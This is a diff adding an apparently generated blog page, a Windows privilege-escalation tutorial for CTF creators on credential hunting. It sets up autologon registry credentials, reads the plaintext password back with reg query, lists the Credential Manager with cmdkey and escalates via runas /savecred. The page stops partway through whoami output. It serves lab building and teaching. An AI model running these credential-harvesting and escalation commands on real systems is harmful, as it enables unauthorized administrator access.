@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - Credential Hunting for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Credential Hunting"><meta property="og:url" content="//localhost:1313/windows-privesc-credential-hunting/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - Credential Hunting for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - Credential Hunting">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Credential Hunting">
+    <meta property="article:tag" content="Plain-Text Files">
+    <meta property="article:tag" content="Answer Files">
+    <meta property="article:tag" content="Windows Credential Manager">
+    <meta property="article:tag" content="Ask for Credentials">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - Credential Hunting for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - Credential Hunting">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-credential-hunting/" /><link rel="prev" href="//localhost:1313/windows-privesc-dll-hijacking/" /><link rel="next" href="//localhost:1313/windows-privesc-apps/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - Credential Hunting for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-credential-hunting\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "credential hunting, plain-text files, answer files, windows credential manager, ask for credentials, local privilege escalation, windows","wordcount":  1952 ,
+        "url": "\/\/localhost:1313\/windows-privesc-credential-hunting\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - Credential Hunting"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Credential Hunting for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1952 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#credential-hunting">Credential Hunting</a>
+      <ul>
+        <li><a href="#autologon">Autologon</a>
+          <ul>
+            <li><a href="#credentials-manager--windows-vault">Credentials Manager / Windows Vault</a></li>
+            <li><a href="#extracting-credentials-from-the-credential-manager">Extracting Credentials from the Credential Manager</a></li>
+          </ul>
+        </li>
+        <li><a href="#plain-text-credentials">Plain-Text Credentials</a>
+          <ul>
+            <li><a href="#answer-files-unattendedxml">Answer Files (Unattend/ed.xml)</a></li>
+          </ul>
+        </li>
+        <li><a href="#sam--system-backups">SAM &amp; SYSTEM Backups</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="credential-hunting">Credential Hunting</h1>
+<p>Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text.</p>
+<h2 id="autologon">Autologon</h2>
+<p>We&rsquo;re gonna add the autologon user to the registry, we need a command prompt or a PowerShell console running as <strong>administrator</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;DefaultUsername&#34;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">user</span> <span class="p">/</span><span class="n">f</span> <span class="p">&gt;</span><span class="n">nul</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;DefaultPassword&#34;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">con321</span> <span class="p">/</span><span class="n">f</span> <span class="p">&gt;</span><span class="n">nul</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;AutoAdminLogon&#34;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="mf">1</span> <span class="p">/</span><span class="n">f</span> <span class="p">&gt;</span><span class="n">nul</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As an attacker from a medium-integrity level console, we can enumerate these credentials with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;Default*&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Winlogon</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DefaultUsername</span>    <span class="n">REG_SZ</span>    <span class="n">user</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DefaultPassword</span>    <span class="n">REG_SZ</span>    <span class="n">con321</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="n">of</span> <span class="n">search</span><span class="err">:</span> <span class="mf">2</span> <span class="n">match</span><span class="p">(</span><span class="n">es</span><span class="p">)</span> <span class="n">found</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="credentials-manager--windows-vault">Credentials Manager / Windows Vault</h3>
+<p>The Windows <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-manager" target="_blank" rel="noopener noreffer ">Credentials Manager</a> is a windows vault that stores user credentials for servers, websites and other programs that <strong>Windows</strong> can <strong>log in the users automatically</strong>. These credentials can be used by Windows to log in to the users automatically, which means that any <strong>Windows application that needs credentials to access a resource</strong> (server or a website) <strong>can make use of this Credential Manager</strong>. I recommend reading this <a href="https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault/" target="_blank" rel="noopener noreffer ">article</a>.</p>
+<figure><a class="lightgallery" href="/images/posts/windows-credential-manager.png" title="/images/posts/windows-credential-manager.png" data-thumbnail="/images/posts/windows-credential-manager.png" data-sub-html="<h2>Windows Credential Manager</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/windows-credential-manager.png"
+            data-srcset="/images/posts/windows-credential-manager.png, /images/posts/windows-credential-manager.png 1.5x, /images/posts/windows-credential-manager.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/windows-credential-manager.png" />
+    </a><figcaption class="image-caption">Windows Credential Manager</figcaption>
+    </figure>
+<p>Basically, the Credential Manager is used by the Windows operating system to store the credentials of applications or addresses such as URLs. This information can be used on local machines, systems on the network/intranet, or even services on the internet such as web services.</p>
+<p>The Credential Manager has two main types of credentials:</p>
+<ul>
+<li><strong>Web Credentials</strong>: Stores websites credentials.</li>
+<li><strong>Windows Credentials</strong>:
+<ul>
+<li><strong>Windows Credentials</strong>: Stores logon credentials such as (Interactive logon)</li>
+<li><strong>Certificate-Based Credentials</strong>: Stores credentials of certificates</li>
+<li><strong>Generic Credentials</strong>: Stores credentials of applications and internet/network addresses.</li>
+</ul>
+</li>
+</ul>
+<p>Let&rsquo;s startup by adding a Window credential of a local user, in this case, the Administrator user:</p>
+<figure><a class="lightgallery" href="/images/posts/admin-credential-manager.png" title="/images/posts/admin-credential-manager.png" data-thumbnail="/images/posts/admin-credential-manager.png" data-sub-html="<h2>Admin Credential Manager</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/admin-credential-manager.png"
+            data-srcset="/images/posts/admin-credential-manager.png, /images/posts/admin-credential-manager.png 1.5x, /images/posts/admin-credential-manager.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/admin-credential-manager.png" />
+    </a><figcaption class="image-caption">Admin Credential Manager</figcaption>
+    </figure>
+<blockquote>
+<p>Note: Verify that the Internet or network address is set to your <code>COMPUTER_NAME\admin</code> and that the User name field has the syntax <code>YOUR_COMPUTER_NAME\Administrator</code> and make sure that the password is correct.</p>
+</blockquote>
+<p>Using the cmdkey we can see the stored credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Currently</span> <span class="n">stored</span> <span class="n">credentials</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Target</span><span class="err">:</span> <span class="n">MicrosoftAccount</span><span class="err">:</span><span class="n">target</span><span class="p">=</span><span class="n">SSO_POP_Device</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span><span class="err">:</span> <span class="n">Generic</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span><span class="err">:</span> <span class="n">02erabxflqezalbj</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Saved</span> <span class="k">for</span> <span class="n">this</span> <span class="n">logon</span> <span class="n">only</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Target</span><span class="err">:</span> <span class="n">WindowsLive</span><span class="err">:</span><span class="n">target</span><span class="p">=</span><span class="n">virtualapp</span><span class="p">/</span><span class="n">didlogical</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span><span class="err">:</span> <span class="n">Generic</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span><span class="err">:</span> <span class="n">02erabxflqezalbj</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Local</span> <span class="n">machine</span> <span class="n">persistence</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Target</span><span class="err">:</span> <span class="n">Domain</span><span class="err">:</span><span class="n">interactive</span><span class="p">=</span><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">admin</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span><span class="err">:</span> <span class="n">Domain</span> <span class="n">Password</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span><span class="err">:</span> <span class="nb">desktop-bn</span><span class="p">\</span><span class="n">Administrator</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the <code>runas /savecred</code>:</p>
+<ul>
+<li>/savecred: is used to use credentials previously saved by the user.</li>
+<li>/user: the user to runas</li>
+</ul>
+<p>Essentially, Windows will go to the credential manager and check for the administrator user and use its password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">admin</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="nb">start </span><span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="n">as</span> <span class="n">user</span> <span class="s2">&#34;desktop-bn\admin&#34;</span> <span class="p">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, this spawns the <code>cmd.exe</code> process as Administrator with High-Integrity Level:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">USER</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Name</span>                     <span class="n">SID</span>
+</span></span><span class="line"><span class="cl"><span class="p">=============================</span> <span class="p">============================================</span>
+</span></span><span class="line"><span class="cl"><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">administrator</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                                                    <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="p">=============================================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                                                      <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Local</span> <span class="n">account</span> <span class="n">and</span> <span class="n">member</span> <span class="n">of</span> <span class="n">Administrators</span> <span class="nb">group Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">114</span>    <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                                        <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Performance</span> <span class="n">Log</span> <span class="n">Users</span>                                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">559</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                                                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">545</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">INTERACTIVE</span>                                      <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">4</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">CONSOLE</span> <span class="n">LOGON</span>                                                 <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">1</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>                                <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">15</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Local</span> <span class="n">account</span>                                    <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">113</span>    <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">LOCAL</span>                                                         <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">64</span><span class="p">-</span><span class="mf">10</span>  <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
